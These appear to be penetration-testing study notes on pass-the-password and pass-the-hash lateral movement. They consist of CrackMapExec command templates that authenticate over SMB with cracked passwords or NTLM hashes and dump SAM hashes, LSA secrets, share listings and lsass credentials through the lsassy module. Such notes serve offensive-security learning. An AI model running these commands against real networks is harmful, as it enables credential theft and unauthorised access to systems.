___
## Pass the Password / Pass the Hash

- If we crack a password and/or can dump the SAM hashes, we can leverage both for lateral movement in networks

![](assets/Pasted%20image%2020251114161232.png)
```
crackmapexec smb <ip/CIDR> -u <user> -d <domain> -p <pass>
```

![](assets/-20251114.png)
```
crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth
```

### CME to dump valuable data

![](assets/-20251114-1.png)
```
crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --sam
```


![](assets/-20251114-2.png)
```
crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --shares
```


![](assets/-20251114-3.png)
```
crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth --lsa
```

### Built-in Modules

![](assets/-20251114-4.png)
```
crackmapexec smb -L
```

- lsass with lsassy

![](assets/-20251114-5.png)
```
crackmapexec smb <ip/CIDR> -u <user> -H <hash> --local-auth -M lsassy
```

### The CME DB (database)

![](assets/-20251114-6.png)
```
cmedb
```

